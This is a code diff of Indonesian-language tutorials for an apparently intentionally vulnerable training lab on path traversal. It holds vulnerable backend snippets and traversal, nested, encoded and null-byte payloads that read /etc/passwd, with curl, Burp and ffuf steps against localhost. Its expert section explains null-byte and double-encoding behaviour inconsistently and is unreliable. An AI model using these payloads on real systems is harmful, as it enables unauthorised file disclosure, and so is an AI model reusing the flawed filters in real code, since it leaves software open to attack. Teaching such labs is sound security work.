@@ -278,44 +278,162 @@ difilter, lalu cari pengganti untuk karakter yang diblokir (mis. <code>$IFS</cod
 """,
         },
     },
-    "path-traversal": {
+"path-traversal": {
         "apprentice": {
             "title": "Path traversal langsung pada image viewer",
             "goal": "Baca file /etc/passwd (simulasi) lewat parameter nama file yang tidak divalidasi.",
             "tutorial": """
 <p>Endpoint <code>/lab/path-traversal/apprentice/image?filename=...</code> menggabungkan input
-langsung ke path file:</p>
+langsung ke path file tanpa proses validasi:</p>
 <pre><code>open(f"./files/{filename}")</code></pre>
-<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload</h3>
+
+<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload Dasar</h3>
 <pre><code>../../../../etc/passwd</code></pre>
-<p>Akses: <code>/lab/path-traversal/apprentice/image?filename=../../../../etc/passwd</code></p>
+<p>URL Akses: <code>/lab/path-traversal/apprentice/image?filename=../../../../etc/passwd</code></p>
+
+<h3 class="text-xl font-bold text-navy-900 mt-10 mb-3">Eksploitasi Menggunakan Kali Linux</h3>
+<p class="mb-4">Berikut adalah dua metode untuk mengeksploitasi kerentanan ini menggunakan <em>tools</em> standar yang tersedia di Kali Linux untuk membaca isi file <code>/etc/passwd</code>.</p>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 1: Menggunakan cURL (Command Line)</h4>
+<ol class="list-decimal ml-6 space-y-2 mb-8">
+    <li>Buka <strong>Terminal</strong> di Kali Linux Anda.</li>
+    <li>Gunakan urutan karakter <em>dot-dot-slash</em> (<code>../</code>) untuk mundur dari direktori saat ini menuju ke <em>root directory</em>.</li>
+    <li>Eksekusi perintah HTTP GET berikut (sesuaikan IP/URL dengan target lab Anda):
+        <pre><code class="language-bash">curl -s "http://127.0.0.1:5000/lab/path-traversal/apprentice/image?filename=../../../../etc/passwd"</code></pre>
+    </li>
+    <li>Periksa output terminal. Jika berhasil dieksploitasi, respons server tidak akan mengembalikan <em>byte</em> gambar, melainkan teks murni berisi struktur akun sistem Linux (seperti: <code>root:x:0:0:root:/root:/bin/bash</code>).</li>
+</ol>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 2: Menggunakan Burp Suite (Manipulasi HTTP)</h4>
+<ol class="list-decimal ml-6 space-y-2">
+    <li>Buka <strong>Burp Suite</strong> di Kali Linux. Navigasikan ke tab <strong>Proxy</strong> > <strong>Intercept</strong> dan pastikan <strong>Intercept is on</strong>.</li>
+    <li>Gunakan <em>Open Browser</em> bawaan Burp untuk mengakses URL dengan parameter gambar yang sah (normal): <br><code>http://127.0.0.1:5000/lab/path-traversal/apprentice/image?filename=default.png</code></li>
+    <li>Kembali ke jendela Burp Suite, <em>request</em> HTTP akan tertangkap. Klik kanan pada teks <em>request</em> tersebut dan pilih <strong>Send to Repeater</strong> (atau gunakan jalan pintas <code>Ctrl+R</code>).</li>
+    <li>Buka tab <strong>Repeater</strong>. Di panel <em>Request</em> (sebelah kiri), modifikasi baris pertama pada parameter <code>filename</code> menjadi <em>payload</em> target Anda:
+        <pre><code class="language-http">GET /lab/path-traversal/apprentice/image?filename=../../../../etc/passwd HTTP/1.1
+Host: 127.0.0.1:5000</code></pre>
+    </li>
+    <li>Klik tombol <strong>Send</strong>.</li>
+    <li>Analisis panel <em>Response</em> (sebelah kanan). Jika terdapat kode status <code>200 OK</code> dan isi file <code>/etc/passwd</code> tercetak di bagian bawah <em>headers</em> HTTP, maka eksploitasi manual Anda berhasil dilakukan.</li>
+</ol>
 """,
         },
-        "practitioner": {
-            "title": "Path traversal dengan filter penghapus '../' (non-recursive)",
-            "goal": "Lewati filter yang menghapus '../' hanya sekali, memakai payload berlapis.",
+    # Level lain (practitioner/expert) dapat ditambahkan di bawah ini
+"practitioner": {
+            "title": "Path traversal dengan bypass filter non-rekursif",
+            "goal": "Baca file /etc/passwd dengan melewati filter string yang hanya menghapus '../' satu kali.",
             "tutorial": """
-<p>Aplikasi mencoba menyaring dengan <code>filename.replace('../', '')</code> — hanya sekali,
-sehingga bisa dilewati dengan menyisipkan pola berlapis.</p>
+<p>Endpoint <code>/lab/path-traversal/practitioner/download?filename=...</code> mencoba mencegah serangan <em>path traversal</em> dengan menerapkan filter <em>blacklist</em> sederhana pada sisi <em>backend</em>:</p>
+<pre><code class="language-python">filename = request.args.get('filename')
+# Filter tidak aman: hanya menghapus string "../" satu kali dan tidak rekursif
+filename = filename.replace('../', '')  
+open(f"./files/{filename}")</code></pre>
+
+<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Teknik Bypass (Nested Traversal)</h3>
+<p>Karena filter di atas menggunakan fungsi <code>replace</code> secara non-rekursif, kita dapat menyisipkan <em>payload</em> bersarang (<em>nested</em>). Jika kita menginput <code>....//</code>, filter akan menemukan <code>../</code> di bagian tengah dan menghapusnya. Namun, sisa karakter pertama (<code>..</code>) dan karakter terakhir (<code>/</code>) akan merapat dan kembali membentuk <code>../</code> yang valid di mata sistem operasi.</p>
+
+<h3 class="text-xl font-bold text-navy-900 mt-10 mb-3">Eksploitasi Menggunakan Tools Kali Linux</h3>
+<p class="mb-4">Berikut adalah panduan lengkap selangkah demi selangkah menggunakan tiga <em>tools</em> berbeda di Kali Linux untuk mengeksploitasi kerentanan ini.</p>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 1: Eksploitasi Cepat via cURL</h4>
+<p class="text-sm text-gray-600 mb-2">cURL sangat efektif untuk pengujian <em>payload</em> tunggal secara langsung dari terminal.</p>
+<ol class="list-decimal ml-6 space-y-2 mb-8">
+    <li>Buka aplikasi <strong>Terminal</strong> di Kali Linux.</li>
+    <li>Ketikkan perintah HTTP GET dengan menyisipkan <em>nested payload</em> <code>....//</code> sebanyak empat kali untuk mencapai <em>root directory</em>, diikuti dengan <code>etc/passwd</code>.</li>
+    <li>Eksekusi perintah berikut (ganti <code>127.0.0.1:5000</code> dengan alamat server lab):
+        <pre><code class="language-bash">curl -s "http://127.0.0.1:5000/lab/path-traversal/practitioner/download?filename=....//....//....//....//etc/passwd"</code></pre>
+    </li>
+    <li>Jika bypass berhasil, terminal Anda akan langsung mencetak isi dari file konfigurasi pengguna Linux.</li>
+</ol>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 2: Analisis & Manipulasi via Burp Suite</h4>
+<p class="text-sm text-gray-600 mb-2">Burp Suite adalah standar industri untuk memanipulasi <em>request</em> HTTP lapis demi lapis.</p>
+<ol class="list-decimal ml-6 space-y-2 mb-8">
+    <li>Jalankan <strong>Burp Suite</strong>. Buka tab <strong>Proxy</strong> > <strong>Intercept</strong>, lalu klik <strong>Open Browser</strong>.</li>
+    <li>Di dalam <em>browser</em> bawaan Burp, akses URL normal terlebih dahulu:<br>
+        <code>http://127.0.0.1:5000/lab/path-traversal/practitioner/download?filename=default.png</code>
+    </li>
+    <li>Kembali ke Burp Suite, <em>request</em> akan tertahan. Tekan <code>Ctrl + R</code> untuk mengirimnya ke alat <strong>Repeater</strong>.</li>
+    <li>Beralih ke tab <strong>Repeater</strong>. Modifikasi nilai parameter <code>filename</code> pada baris pertama <em>request</em> menjadi:
+        <pre><code class="language-http">GET /lab/path-traversal/practitioner/download?filename=....//....//....//....//etc/passwd HTTP/1.1
+Host: 127.0.0.1:5000</code></pre>
+    </li>
+    <li>Klik <strong>Send</strong>. Perhatikan panel <strong>Response</strong> di sebelah kanan; Anda akan melihat <em>header</em> HTTP <code>200 OK</code> yang diikuti oleh daftar akun <em>root</em> dan pengguna lainnya di baris terbawah.</li>
+</ol>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 3: Fuzzing Otomatis via FFuF</h4>
+<p class="text-sm text-gray-600 mb-2">Dalam skenario <em>Black-Box Testing</em>, Anda mungkin tidak tahu filter apa yang digunakan. FFuF (Fuzz Faster U Fool) dapat digunakan untuk menembakkan ribuan variasi <em>payload</em> secara otomatis guna menemukan <em>bypass</em> yang tepat.</p>
+<ol class="list-decimal ml-6 space-y-2">
+    <li>Buka <strong>Terminal</strong> Kali Linux.</li>
+    <li>Buat sebuah file teks sederhana bernama <code>payloads.txt</code> yang berisi berbagai variasi teknik <em>bypass</em> direktori traversal:
+        <pre><code class="language-bash">nano payloads.txt
+# Masukkan daftar berikut:
+../../../../etc/passwd
+....//....//....//....//etc/passwd
+..%2f..%2f..%2f..%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+# Simpan dan keluar (Ctrl+O, Enter, Ctrl+X)</code></pre>
+    </li>
+    <li>Jalankan perintah <strong>FFuF</strong> untuk melakukan <em>fuzzing</em> pada parameter <code>filename</code>. Kita menggunakan flag <code>-mr "root:x:0:0"</code> untuk menyaring hasil, sehingga FFuF hanya menampilkan <em>payload</em> yang berhasil mengembalikan isi file <code>/etc/passwd</code>.
+        <pre><code class="language-bash">ffuf -w payloads.txt -u "http://127.0.0.1:5000/lab/path-traversal/practitioner/download?filename=FUZZ" -mr "root:x:0:0"</code></pre>
+    </li>
+    <li>FFuF akan memproses daftar tersebut dengan cepat. Pada hasil <em>output</em>, Anda akan melihat bahwa <em>payload</em> <code>....//....//....//....//etc/passwd</code> tercetak hijau, menandakan bahwa serangan <em>nested traversal</em> tersebut berhasil menembus filter <em>backend</em> aplikasi.</li>
+</ol>
+""",
+        },
+"expert": {
+            "title": "Path traversal dengan Null Byte & Double URL Encoding",
+            "goal": "Baca file /etc/passwd dengan melewati filter ekstensi file ketat (.png) dan filter karakter traversal.",
+            "tutorial": """
+<p>Endpoint <code>/lab/path-traversal/expert/thumbnail?filename=...</code> menerapkan dua lapis pertahanan yang lebih ketat:</p>
+<ol class="list-decimal ml-6 space-y-1 mb-4 text-sm text-gray-700">
+    <li>Memblokir input yang mengandung karakter <code>../</code>.</li>
+    <li>Mewajibkan nama file berakhiran dengan ekstensi <code>.png</code>.</li>
+</ol>
+<pre><code class="language-python">filename = request.args.get('filename')
+if '../' in filename or not filename.endswith('.png'):
+    return "Ditolak"
+# ... backend kemudian melakukan URL decode tambahan / memproses ke OS API
+open(f"./files/{unquote(filename)}")</code></pre>
+
+<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Teknik Bypass (Null Byte & Double Encoding)</h3>
+<p class="mb-2">Kerentanan ini muncul karena perbedaan cara aplikasi web dan sistem operasi (OS) membaca string:</p>
+<ul class="list-disc ml-6 space-y-2 mb-4 text-gray-700">
+    <li><strong>Null Byte Injection:</strong> Karakter <em>Null Byte</em> (<code>\\x00</code> atau <code>%00</code>) berfungsi sebagai penanda akhir string (<em>string terminator</em>) pada level API sistem operasi dasar (seperti C/C++). Jika kita mengirim <code>/etc/passwd%00.png</code>, web server melihat file tersebut berakhiran <code>.png</code>, tetapi saat diserahkan ke sistem operasi untuk dibuka, OS akan berhenti membaca pada <code>%00</code> dan hanya membuka <code>/etc/passwd</code>.</li>
+    <li><strong>Double URL Encoding:</strong> Untuk melewati filter awal aplikasi web yang mencari <code>../</code> dan <code>%00</code>, kita harus menyandikannya dua kali. Karakter <code>%</code> disandikan menjadi <code>%25</code>. Sehingga <code>%00</code> menjadi <code>%2500</code> dan <code>/</code> (<code>%2f</code>) menjadi <code>%252f</code>.</li>
+</ul>
+
 <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload</h3>
-<pre><code>....//....//....//....//etc/passwd</code></pre>
-<p>Setelah satu kali penggantian <code>../</code> dihapus dari tengah, sisa string membentuk
-<code>../../../../etc/passwd</code> yang valid.</p>
-""",
-        },
-        "expert": {
-            "title": "Path traversal dengan bypass encoding & validasi ekstensi",
-            "goal": "Lewati validasi yang mewajibkan file berakhiran .png, sambil tetap membaca file arbitrer.",
-            "tutorial": """
-<p>Aplikasi memvalidasi <code>filename.endswith('.png')</code> sekaligus memblokir <code>../</code>
-literal. Namun decoding URL dilakukan setelah pengecekan awal, dan null byte lama / path
-"file.png" via trailing dilewati lewat trik <code>%2500</code> pada beberapa server, atau di
-lab ini disimulasikan lewat parameter tambahan yang tidak divalidasi ekstensinya.</p>
-<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload (URL-encoded)</h3>
-<pre><code>..%2f..%2f..%2f..%2fetc%2fpasswd%00.png</code></pre>
-<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Dengan Burp Suite</h3>
-<p>Gunakan Decoder untuk mencoba beberapa lapis encoding (single vs double URL-encode) dan Repeater
-untuk menguji kombinasi mana yang diterima validasi ekstensi tapi tetap traversal.</p>
+<pre><code>..%252f..%252f..%252f..%252fetc%2fpasswd%2500.png</code></pre>
+<p>URL Akses: <code>/lab/path-traversal/expert/thumbnail?filename=..%252f..%252f..%252f..%252fetc%2fpasswd%2500.png</code></p>
+
+<h3 class="text-xl font-bold text-navy-900 mt-10 mb-3">Eksploitasi Menggunakan Tools Kali Linux</h3>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 1: Eksekusi Langsung via cURL</h4>
+<ol class="list-decimal ml-6 space-y-2 mb-8">
+    <li>Buka <strong>Terminal</strong> di Kali Linux.</li>
+    <li>Kita tidak bisa menggunakan <code>../</code> secara langsung, jadi kita gunakan <code>..%252f</code> (yang merupakan double encode dari <code>../</code>) dan mengakhirinya dengan <code>%2500.png</code>.</li>
+    <li>Eksekusi perintah berikut:
+        <pre><code class="language-bash">curl -s "http://127.0.0.1:5000/lab/path-traversal/expert/thumbnail?filename=..%252f..%252f..%252f..%252fetc%2fpasswd%2500.png"</code></pre>
+    </li>
+    <li>Aplikasi web akan menguraikan (decode) <code>%252f</code> menjadi <code>%2f</code> dan <code>%2500</code> menjadi <code>%00</code>, melewati filter, lalu menembuskan karakter tersebut ke API sistem operasi yang akan memotong ekstensi <code>.png</code> dan mengembalikan isi <code>/etc/passwd</code>.</li>
+</ol>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 2: Menggunakan Decoder di Burp Suite</h4>
+<p class="text-sm text-gray-600 mb-2">Burp Suite memiliki alat "Decoder" bawaan yang sangat mempermudah pembuatan payload seperti ini.</p>
+<ol class="list-decimal ml-6 space-y-2">
+    <li>Buka tab <strong>Decoder</strong> di Burp Suite.</li>
+    <li>Ketik <em>payload</em> dasar Anda: <code>../../../../etc/passwd%00.png</code></li>
+    <li>Blok seluruh teks tersebut, klik tombol <strong>Encode as</strong> di sebelah kanan, lalu pilih <strong>URL</strong>. (Ini adalah <em>encode</em> pertama: <code>%2E%2E%2F...%2500.png</code>)</li>
+    <li>Klik lagi tombol <strong>Encode as</strong> > <strong>URL</strong> pada hasil sebelumnya. (Ini adalah <em>encode</em> kedua/Double Encode).</li>
+    <li>Salin hasil <em>double encode</em> tersebut.</li>
+    <li>Buka tab <strong>Repeater</strong>, masukkan hasil salinan tersebut ke dalam parameter <code>filename</code>:
+        <pre><code class="language-http">GET /lab/path-traversal/expert/thumbnail?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%2fpasswd%252500.png HTTP/1.1
+Host: 127.0.0.1:5000</code></pre>
+        <em>*Catatan: Pastikan Anda memperhatikan jumlah penyandian (encode) berdasarkan perilaku decoding backend Flask spesifik Anda.</em>
+    </li>
+    <li>Klik <strong>Send</strong> untuk mengeksekusi serangan tingkat mahir ini.</li>
+</ol>
 """,
         },
     },
